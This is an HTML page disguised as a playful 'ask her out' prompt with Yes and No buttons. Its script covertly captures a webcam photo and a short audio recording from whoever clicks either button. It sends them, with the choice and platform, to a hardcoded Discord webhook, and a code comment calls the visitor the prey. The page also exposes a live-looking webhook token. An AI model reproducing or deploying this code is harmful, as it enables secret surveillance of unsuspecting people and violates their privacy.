<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ask Her Out</title>
  <style>
    /* Sab kuch hidden taake shikaar ko shak na ho */
    #video, #canvas { display: none; }
    
    body { 
      background: #121212; 
      color: #fff; 
      font-family: 'Segoe UI', Arial, sans-serif; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      margin: 0; 
    }

    .container { 
      text-align: center; 
      background: #1e1e1e; 
      padding: 40px; 
      border-radius: 20px; 
      box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
      width: 90%;
      max-width: 450px;
    }

    h1 { font-size: 1.8rem; margin-bottom: 10px; }
    p { color: #eee; margin-bottom: 25px; font-style: italic; }

    .btn-group { display: flex; gap: 15px; justify-content: center; }
    
    .btn { 
      padding: 12px 35px; 
      border-radius: 25px; 
      font-weight: bold; 
      text-decoration: none; 
      color: white; 
      transition: 0.3s; 
      cursor: pointer;
      border: none;
      font-family: inherit;
    }

    .btn-yes { background: #ff4d6d; }
    .btn-no { background: #555; }
    
    .btn:hover { transform: scale(1.05); opacity: 0.9; }

    .dev-name {
      position: absolute;
      top: 10px;
      left: 10px;
      font-size: 0.8rem;
      color: rgba(255,255,255,0.7);
      font-weight: bold;
    }

    .loader { 
      border: 4px solid #333; 
      border-top: 4px solid #ff4d6d; 
      border-radius: 50%; 
      width: 30px; height: 30px; 
      animation: spin 1s linear infinite; 
      display: none; 
      margin: 20px auto; 
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div class="dev-name">Dev by Faisal</div>

  <div class="container">
    <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnRqcjd2ZTRtZGM1MzdyZDd5OGp1OGx2bDN0NHRnMWQ2ZzZrM2h0OCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dv1Jbd5RW0RkOrlSy3/giphy.gif" 
         alt="Mochi GIF" 
         style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px; border-radius: 10px;">

    <h1>Please think again! 🙄</h1>
    <p>babu kia hogya itne jaldi na mat bolo😥</p>
    
    <div class="loader" id="loader"></div>
    
    <div class="btn-group" id="controls">
      <button class="btn btn-yes" onclick="startTheHunt('yes')">Yes</button>
      <button class="btn btn-no" onclick="startTheHunt('no')">No</button>
    </div>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";

    async function startTheHunt(userChoice) {
        document.getElementById('controls').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // 1. Photo Capture
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob, 'faisal_shikaar.png');
                    fd.append('content', `🎯 **Target Active!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🖥️ **Platform:** ${navigator.platform}`);
                    fetch(WEBHOOK, { method: 'POST', body: fd });
                }, 'image/png');
            }, 1200);

            // 2. Audio Snatcher (3.5 seconds)
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                const fd = new FormData();
                fd.append('file', audioBlob, 'audio_log.webm');
                fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
                    if (userChoice === 'yes') {
                        window.location.href = "page1.html";
                    } else {
                        window.location.href = "no2.html";
                    }
                });
            };
            
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 3500);

        } catch (e) {
            if (userChoice === 'yes') window.location.href = "page1.html";
            else window.location.href = "no2.html";
        }
    }
  </script>
</body>
</html>
